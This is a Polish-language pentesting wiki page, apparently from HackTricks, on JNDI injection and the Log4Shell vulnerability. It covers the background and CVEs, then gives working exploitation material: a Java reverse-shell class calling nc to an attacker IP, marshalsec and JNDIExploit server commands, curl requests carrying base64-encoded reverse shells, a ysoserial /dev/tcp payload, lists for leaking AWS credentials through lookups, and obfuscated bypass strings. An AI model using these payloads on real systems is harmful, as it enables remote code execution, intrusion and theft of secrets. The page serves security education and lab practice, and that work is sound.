# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Podstawowe informacje

JNDI, zintegrowane z Jav od koca lat 90-tych, su偶y jako usuga katalogowa, umo偶liwiajc programom Java lokalizowanie danych lub obiekt贸w za pomoc systemu nazw. Obsuguje r贸偶ne usugi katalogowe za porednictwem interfejs贸w dostawc贸w usug (SPI), umo偶liwiajc pobieranie danych z r贸偶nych system贸w, w tym zdalnych obiekt贸w Java. Powszechne SPI to CORBA COS, Java RMI Registry i LDAP.

### Odniesienie do nazw JNDI

Obiekty Java mog by przechowywane i pobierane za pomoc Odniesie do nazw JNDI, kt贸re wystpuj w dw贸ch formach:

* **Adresy odniesienia**: Okrela lokalizacj obiektu (np. _rmi://server/ref_), umo偶liwiajc bezporednie pobranie z okrelonego adresu.
* **Zdalna fabryka**: Odnosi si do zdalnej klasy fabryki. Po uzyskaniu dostpu klasa jest pobierana i instancjonowana z zdalnej lokalizacji.

Jednak ten mechanizm mo偶e by wykorzystywany, co mo偶e prowadzi do adowania i wykonywania dowolnego kodu. Jako rodek zaradczy:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` domylnie od JDK 7u21, ograniczajc adowanie zdalnych obiekt贸w. Mened偶er bezpieczestwa dodatkowo ogranicza to, co mo偶e by adowane.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` domylnie od JDK 6u141, 7u131, 8u121, blokujc wykonywanie zdalnie adowanych obiekt贸w Java. Jeli ustawione na `true`, mo偶liwe jest zdalne wykonanie kodu bez nadzoru Mened偶era bezpieczestwa.
* **CORBA**: Nie ma konkretnej waciwoci, ale Mened偶er bezpieczestwa jest zawsze aktywny.

Jednak **Mened偶er nazw**, odpowiedzialny za rozwizywanie link贸w JNDI, nie ma wbudowanych mechanizm贸w zabezpieczajcych, co mo偶e pozwoli na pobieranie obiekt贸w z dowolnego 藕r贸da. Stanowi to ryzyko, poniewa偶 zabezpieczenia RMI, LDAP i CORBA mog by omijane, co prowadzi do adowania dowolnych obiekt贸w Java lub wykorzystywania istniejcych komponent贸w aplikacji (gad偶et贸w) do uruchamiania zoliwego kodu.

Przykady podatnych adres贸w URL to:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

Pomimo zabezpiecze, luki pozostaj, g贸wnie z powodu braku zabezpiecze przed adowaniem JNDI z nieufnych 藕r贸de oraz mo偶liwoci ominicia istniejcych zabezpiecze.

### Przykad JNDI

![](<../../.gitbook/assets/image (1022).png>)

Nawet jeli ustawie **`PROVIDER_URL`**, mo偶esz wskaza inny w wyszukiwaniu, a zostanie on u偶yty: `ctx.lookup("<attacker-controlled-url>")` i to jest to, co napastnik wykorzysta do adowania dowolnych obiekt贸w z systemu, kt贸rym zarzdza.

### Przegld CORBA

CORBA (Common Object Request Broker Architecture) wykorzystuje **Interoperable Object Reference (IOR)** do unikalnej identyfikacji zdalnych obiekt贸w. To odniesienie zawiera istotne informacje, takie jak:

* **ID typu**: Unikalny identyfikator dla interfejsu.
* **Codebase**: URL do uzyskania klasy stub.

Warto zauwa偶y, 偶e CORBA nie jest z natury podatna. Zapewnienie bezpieczestwa zazwyczaj obejmuje:

* Instalacj **Mened偶era bezpieczestwa**.
* Konfiguracj Mened偶era bezpieczestwa, aby zezwoli na poczenia z potencjalnie zoliwymi bazami kodu. Mo偶na to osign poprzez:
* Uprawnienia do gniazd, np. `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Uprawnienia do odczytu plik贸w, albo uniwersalnie (`permission java.io.FilePermission "<<ALL FILES>>", "read";`), albo dla konkretnych katalog贸w, w kt贸rych mog by umieszczone zoliwe pliki.

Jednak niekt贸re polityki dostawc贸w mog by poba偶liwe i domylnie zezwala na te poczenia.

### Kontekst RMI

W przypadku RMI (Remote Method Invocation) sytuacja jest nieco inna. Podobnie jak w przypadku CORBA, domylnie ograniczone jest pobieranie dowolnych klas. Aby wykorzysta RMI, zazwyczaj trzeba by obej Mened偶era bezpieczestwa, co jest r贸wnie偶 istotne w CORBA.

### LDAP

Przede wszystkim musimy odr贸偶ni wyszukiwanie od wyszukiwania.\
**Wyszukiwanie** u偶yje URL, takiego jak `ldap://localhost:389/o=JNDITutorial`, aby znale藕 obiekt JNDITutorial z serwera LDAP i **pobra jego atrybuty**.\
**Wyszukiwanie** jest przeznaczone do **usug nazw**, poniewa偶 chcemy uzyska **wszystko, co jest powizane z nazw**.

Jeli wyszukiwanie LDAP zostao wywoane z **SearchControls.setReturningObjFlag() z `true`, to zwr贸cony obiekt zostanie zrekonstruowany**.

Dlatego istnieje kilka sposob贸w ataku na te opcje.\
**Napastnik mo偶e zanieczyci rekordy LDAP, wprowadzajc adunki** na nich, kt贸re bd wykonywane w systemach, kt贸re je zbieraj (bardzo przydatne do **kompromitacji dziesitek maszyn**, jeli masz dostp do serwera LDAP). Innym sposobem wykorzystania tego byoby przeprowadzenie **ataku MitM w wyszukiwaniu LDAP**, na przykad.

W przypadku, gdy mo偶esz **sprawi, aby aplikacja rozwizaa URL JNDI LDAP**, mo偶esz kontrolowa LDAP, kt贸ry bdzie przeszukiwany, i mo偶esz odesa exploit (log4shell).

#### Wykorzystanie deserializacji

![](<../../.gitbook/assets/image (275).png>)

**Eksploit jest serializowany** i bdzie deserializowany.\
W przypadku, gdy `trustURLCodebase` jest `true`, napastnik mo偶e dostarczy swoje wasne klasy w bazie kodu, jeli nie, bdzie musia wykorzysta gad偶ety w classpath.

#### Wykorzystanie odniesienia JNDI

atwiej jest zaatakowa ten LDAP, u偶ywajc **odniesie JavaFactory**:

![](<../../.gitbook/assets/image (1059).png>)

## Luka Log4Shell

Luka zostaa wprowadzona w Log4j, poniewa偶 obsuguje [**specjaln skadni**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) w formie `${prefix:name}`, gdzie `prefix` jest jednym z wielu r贸偶nych [**Wyszukiwa**](https://logging.apache.org/log4j/2.x/manual/lookups.html), kt贸re powinny by oceniane. Na przykad, `${java:version}` to aktualnie uruchomiona wersja Javy.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) wprowadzio funkcj Wyszukiwania `jndi`. Ta funkcja umo偶liwia pobieranie zmiennych przez JNDI. Zazwyczaj klucz jest automatycznie poprzedzany `java:comp/env/`. Jednak jeli sam klucz zawiera **":"**, ten domylny prefiks nie jest stosowany.

Gdy w kluczu znajduje si **:**, jak w `${jndi:ldap://example.com/a}`, nie ma **prefiksu** i **serwer LDAP jest zapytany o obiekt**. A te Wyszukiwania mog by u偶ywane zar贸wno w konfiguracji Log4j, jak i podczas rejestrowania linii.

Dlatego jedyn rzecz potrzebn do uzyskania RCE jest **podatna wersja Log4j przetwarzajca informacje kontrolowane przez u偶ytkownika**. A poniewa偶 jest to biblioteka szeroko stosowana przez aplikacje Java do rejestrowania informacji (w tym aplikacje dostpne w Internecie), bardzo powszechne byo, aby log4j rejestrowa na przykad nag贸wki HTTP, takie jak User-Agent. Jednak log4j **nie jest u偶ywane tylko do rejestrowania informacji HTTP, ale wszelkich danych** i danych, kt贸re wskaza programista.

## Przegld CVE zwizanych z Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Krytyczne]**

Ta luka jest krytyczn **wad nieufnej deserializacji** w komponencie `log4j-core`, wpywajc na wersje od 2.0-beta9 do 2.14.1. Umo偶liwia **zdalne wykonanie kodu (RCE)**, umo偶liwiajc napastnikom przejcie system贸w. Problem zosta zgoszony przez Chena Zhaojuna z zespou bezpieczestwa Alibaba Cloud i wpywa na r贸偶ne frameworki Apache. Pocztkowa poprawka w wersji 2.15.0 bya niekompletna. Zasady Sigma dla obrony s dostpne ([Zasada 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Zasada 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Krytyczne]**

Pocztkowo oceniana jako niska, ale p贸藕niej podniesiona do krytycznej, ta CVE jest **wad Denial of Service (DoS)** wynikajc z niekompletnej poprawki w 2.15.0 dla CVE-2021-44228. Dotyczy to konfiguracji nie domylnych, umo偶liwiajc napastnikom powodowanie atak贸w DoS za pomoc stworzonych adunk贸w. [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) pokazuje metod obejcia. Problem zosta rozwizany w wersjach 2.16.0 i 2.12.2 poprzez usunicie wzorc贸w wyszukiwania wiadomoci i domylne wyczenie JNDI.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Wysoka]**

Dotyczy **wersji Log4j 1.x** w konfiguracjach nie domylnych u偶ywajcych `JMSAppender`, ta CVE jest wad nieufnej deserializacji. Nie ma dostpnej poprawki dla gazi 1.x, kt贸ra jest zakoczona, a zaleca si aktualizacj do `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Umiarkowana]**

Ta luka dotyczy **frameworka logowania Logback**, nastpcy Log4j 1.x. Wczeniej uwa偶any za bezpieczny, framework okaza si podatny, a nowsze wersje (1.3.0-alpha11 i 1.2.9) zostay wydane w celu rozwizania problemu.

### **CVE-2021-45105** **\[Wysoka]**

Log4j 2.16.0 zawiera wad DoS, co skonio do wydania `log4j 2.17.0` w celu naprawy CVE. Dalsze szczeg贸y znajduj si w raporcie BleepingComputer [tutaj](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Dotyczy wersji log4j 2.17, ta CVE wymaga, aby napastnik kontrolowa plik konfiguracyjny log4j. Dotyczy to potencjalnego zdalnego wykonania kodu za porednictwem skonfigurowanego JDBCAppender. Wicej szczeg贸贸w znajduje si w [pocie na blogu Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Wykorzystanie Log4Shell

### Odkrycie

Ta luka jest bardzo atwa do odkrycia, jeli jest niechroniona, poniewa偶 wyle co najmniej **偶danie DNS** do adresu, kt贸ry wska偶esz w swoim adunku. Dlatego adunki takie jak:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (u偶ywajc [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (u偶ywajc [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (u偶ywajc Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (u偶ywajc [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (u偶ywajc [huntress](https://log4shell.huntress.com))

Zauwa偶, 偶e **nawet jeli otrzymano 偶danie DNS, to nie oznacza, 偶e aplikacja jest podatna** (ani nawet wra偶liwa), bdziesz musia spr贸bowa j wykorzysta.

{% hint style="info" %}
Pamitaj, 偶e aby **wykorzysta wersj 2.15**, musisz doda **obejcie sprawdzania localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Odkrycie lokalne**

Szukaj **lokalnych podatnych wersji** biblioteki za pomoc:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Weryfikacja**

Niekt贸re z wczeniej wymienionych platform pozwol Ci na wprowadzenie zmiennych danych, kt贸re bd rejestrowane, gdy zostan za偶dane.\
Mo偶e to by bardzo przydatne w 2 rzeczach:

* Aby **zweryfikowa** podatno
* Aby **ekstrahowa informacje** wykorzystujc podatno

Na przykad mo偶esz za偶da czego takiego:\
lub jak `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i jeli **偶danie DNS zostanie odebrane z wartoci zmiennej env**, wiesz, 偶e aplikacja jest podatna.

Inne informacje, kt贸re mo偶esz spr贸bowa **wyciek**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
Hosty dziaajce na wersjach JDK powy偶ej 6u141, 7u131 lub 8u121 s zabezpieczone przed wektorem ataku adowania klas LDAP. Wynika to z domylnej dezaktywacji `com.sun.jndi.ldap.object.trustURLCodebase`, kt贸ra zapobiega adowaniu zdalnej bazy kodu przez JNDI za porednictwem LDAP. Nale偶y jednak zauwa偶y, 偶e te wersje **nie s chronione przed wektorem ataku deserializacji**.

Dla atakujcych, kt贸rzy chc wykorzysta te wy偶sze wersje JDK, konieczne jest wykorzystanie **zaufanego gad偶etu** w aplikacji Java. Narzdzia takie jak ysoserial lub JNDIExploit s czsto u偶ywane w tym celu. Z drugiej strony, wykorzystanie ni偶szych wersji JDK jest stosunkowo atwiejsze, poniewa偶 te wersje mo偶na manipulowa, aby adowa i wykonywa dowolne klasy.

Dla **wicej informacji** (_jak ograniczenia dotyczce wektor贸w RMI i CORBA_) **sprawd藕 poprzedni sekcj JNDI Naming Reference** lub [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec z niestandardowym adunkiem

Mo偶esz to przetestowa w **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

U偶yj narzdzia [**marshalsec**](https://github.com/mbechler/marshalsec) (wersja jar dostpna [**tutaj**](https://github.com/RandomRobbieBF/marshalsec-jar)). To podejcie ustanawia serwer referencyjny LDAP, aby przekierowa poczenia do drugiego serwera HTTP, na kt贸rym bdzie hostowany exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Aby skoni cel do zaadowania kodu reverse shell, stw贸rz plik Java o nazwie `Exploit.java` z poni偶sz zawartoci:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Skompiluj plik Java do pliku klasowego za pomoc: `javac Exploit.java -source 8 -target 8`. Nastpnie uruchom **serwer HTTP** w katalogu zawierajcym plik klasowy za pomoc: `python3 -m http.server`. Upewnij si, 偶e **serwer LDAP marshalsec** odnosi si do tego serwera HTTP.

Wywoaj wykonanie klasy exploitu na podatnym serwerze WWW, wysyajc adunek przypominajcy:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Uwaga:** Ten exploit opiera si na konfiguracji Javy, kt贸ra pozwala na adowanie zdalnych baz kodu za pomoc LDAP. Jeli to nie jest dozwolone, rozwa偶 wykorzystanie zaufanej klasy do wykonania dowolnego kodu.

### RCE - **JNDIExploit**

{% hint style="info" %}
Zauwa偶, 偶e z jakiego powodu autor usun ten projekt z githuba po odkryciu log4shell. Mo偶esz znale藕 wersj w pamici podrcznej pod adresem [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ale jeli chcesz uszanowa decyzj autora, u偶yj innej metody, aby wykorzysta t luk.

Ponadto, nie mo偶esz znale藕 kodu 藕r贸dowego w wayback machine, wic albo przeanalizuj kod 藕r贸dowy, albo uruchom jar, wiedzc, 偶e nie wiesz, co uruchamiasz.
{% endhint %}

W tym przykadzie mo偶esz po prostu uruchomi ten **vulnerable web server to log4shell** na porcie 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_w README znajdziesz, jak to uruchomi_). Ta podatna aplikacja rejestruje z podatn wersj log4shell zawarto nag贸wka 偶dania HTTP _X-Api-Version_.

Nastpnie mo偶esz pobra plik jar **JNDIExploit** i uruchomi go za pomoc:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Po przeczytaniu kodu przez zaledwie kilka minut, w _com.feihong.ldap.LdapServer_ i _com.feihong.ldap.HTTPServer_ mo偶na zobaczy, jak **tworzone s serwery LDAP i HTTP**. Serwer LDAP zrozumie, jaki adunek nale偶y dostarczy i przekieruje ofiar do serwera HTTP, kt贸ry dostarczy exploit.\
W _com.feihong.ldap.gadgets_ mo偶na znale藕 **niekt贸re specyficzne gad偶ety**, kt贸re mog by u偶yte do wykonania po偶danej akcji (potencjalnie wykonania dowolnego kodu). A w _com.feihong.ldap.template_ mo偶na zobaczy r贸偶ne klasy szablon贸w, kt贸re **generuj exploity**.

Mo偶esz zobaczy wszystkie dostpne exploity za pomoc **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Niekt贸re przydatne to:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Wic w naszym przykadzie mamy ju偶 uruchomion t podatn aplikacj docker. Aby j zaatakowa:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kiedy wysyasz ataki, zobaczysz pewne wyjcie w terminalu, w kt贸rym uruchomie **JNDIExploit-1.2-SNAPSHOT.jar**.

**Pamitaj, aby sprawdzi `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` w poszukiwaniu innych opcji eksploatacji. Ponadto, w razie potrzeby, mo偶esz zmieni port serwer贸w LDAP i HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

W podobny spos贸b jak w poprzednim exploicie, mo偶esz spr贸bowa u偶y [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) do wykorzystania tej luki.\
Mo偶esz wygenerowa adresy URL do wysania do ofiary, uruchamiajc:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Atak ten wykorzystujcy niestandardowy obiekt java bdzie dziaa w laboratoriach takich jak **THM solar room**. Jednak偶e, zazwyczaj nie zadziaa (poniewa偶 domylnie Java nie jest skonfigurowana do adowania zdalnych baz kodu za pomoc LDAP), myl, 偶e to dlatego, 偶e nie nadu偶ywa zaufanej klasy do wykonywania dowolnego kodu._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) to kolejne narzdzie do generowania **dziaajcych link贸w JNDI** i zapewniania usug w tle poprzez uruchomienie serwera RMI, serwera LDAP i serwera HTTP.\

### RCE - ysoserial & JNDI-Exploit-Kit

Ta opcja jest naprawd przydatna do atakowania **wersji Java skonfigurowanych do zaufania tylko okrelonym klasom, a nie wszystkim**. Dlatego **ysoserial** bdzie u偶ywany do generowania **serializacji zaufanych klas**, kt贸re mog by u偶ywane jako gad偶ety do **wykonywania dowolnego kodu** (_zaufana klasa nadu偶ywana przez ysoserial musi by u偶ywana przez program java ofiary, aby exploit zadziaa_).

U偶ywajc **ysoserial** lub [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) mo偶esz stworzy exploit deserializacji, kt贸ry zostanie pobrany przez JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
U偶yj [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), aby wygenerowa **linki JNDI**, gdzie exploit bdzie czeka na poczenia z podatnymi maszynami. Mo偶esz serwowa **r贸偶ne exploity, kt贸re mog by automatycznie generowane** przez JNDI-Exploit-Kit lub nawet **wasne adunki deserializacji** (wygenerowane przez Ciebie lub ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

Teraz mo偶esz atwo u偶y wygenerowanego linku JNDI, aby wykorzysta luk i uzyska **reverse shell**, wysyajc do podatnej wersji log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Ominicia
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:谋}}:ldap://...} //Notice the unicode "i"
```
### Automatyczne skanery

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Znajd藕 lokalne podatne biblioteki

### Laboratoria do testowania

* [**LogForge HTB machine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Eksploatacja po Log4Shell

W tym [**opisie CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) dobrze wyjaniono, jak potencjalnie **mo偶liwe** jest **nadu偶ycie** niekt贸rych funkcji **Log4J**.

Strona [**bezpieczestwa**](https://logging.apache.org/log4j/2.x/security.html) Log4j zawiera kilka interesujcych zda:

> Od wersji 2.16.0 (dla Java 8), **funkcja wyszukiwania wiadomoci zostaa cakowicie usunita**. **Wyszukiwania w konfiguracji nadal dziaaj**. Ponadto, Log4j teraz domylnie wycza dostp do JNDI. Wyszukiwania JNDI w konfiguracji musz by teraz wczone jawnie.

> Od wersji 2.17.0 (oraz 2.12.3 i 2.3.1 dla Java 7 i Java 6), **tylko cigi wyszukiwania w konfiguracji s rozwijane rekurencyjnie**; w ka偶dym innym u偶yciu, tylko wyszukiwanie na najwy偶szym poziomie jest rozwizywane, a wszelkie zagnie偶d偶one wyszukiwania nie s rozwizywane.

Oznacza to, 偶e domylnie mo偶esz **zapomnie o u偶ywaniu jakiejkolwiek exploita `jndi`**. Co wicej, aby wykona **rekurencyjne wyszukiwania**, musisz je skonfigurowa.

Na przykad, w tym CTF byo to skonfigurowane w pliku log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

W [tym CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) atakujcy kontrolowa warto `${sys:cmd}` i musia wyekstrahowa flag z zmiennej rodowiskowej.\
Jak wida na tej stronie w [**poprzednich adunkach**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), istnieje kilka sposob贸w dostpu do zmiennych rodowiskowych, takich jak: **`${env:FLAG}`**. W tym CTF byo to bezu偶yteczne, ale mo偶e nie by w innych rzeczywistych scenariuszach.

### Exfiltration in Exceptions

W CTF **nie moge uzyska dostpu do stderr** aplikacji java u偶ywajcej log4J, ale wyjtki Log4J **s wysyane do stdout**, co byo drukowane w aplikacji python. Oznaczao to, 偶e wywoujc wyjtek, moglimy uzyska dostp do treci. Wyjtek do wyekstrahowania flagi to: **`${java:${env:FLAG}}`.** Dziaa to, poniewa偶 **`${java:CTF{blahblah}}`** nie istnieje, a wyjtek z wartoci flagi zostanie pokazany:

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

Warto to wspomnie, mo偶na r贸wnie偶 wstrzykn nowe [**wzorce konwersji**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i wywoa wyjtki, kt贸re bd rejestrowane w `stdout`. Na przykad:

![](<../../.gitbook/assets/image (683).png>)

To nie byo uznawane za przydatne do wyekstrahowania danych wewntrz komunikatu o bdzie, poniewa偶 wyszukiwanie nie zostao rozwizane przed wzorcem konwersji, ale mogoby by przydatne do innych rzeczy, takich jak wykrywanie.

### Conversion Patterns Regexes

Jednak mo偶liwe jest u偶ycie niekt贸rych **wzorc贸w konwersji, kt贸re obsuguj regexy**, aby wyekstrahowa informacje z wyszukiwania, u偶ywajc regex贸w i nadu偶ywajc **wyszukiwania binarnego** lub **zachowa opartych na czasie**.

* **Wyszukiwanie binarne za pomoc komunikat贸w o wyjtkach**

Wzorzec konwersji **`%replace`** mo偶e by u偶yty do **zamiany** **treci** z **acucha** nawet przy u偶yciu **regex贸w**. Dziaa to w ten spos贸b: `replace{pattern}{regex}{substitution}`\
Nadu偶ywajc tego zachowania, mo偶na sprawi, 偶e zamiana **wywoa wyjtek, jeli regex dopasuje** cokolwiek wewntrz acucha (i brak wyjtku, jeli nie zostanie znalezione) w ten spos贸b:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Czasowe**

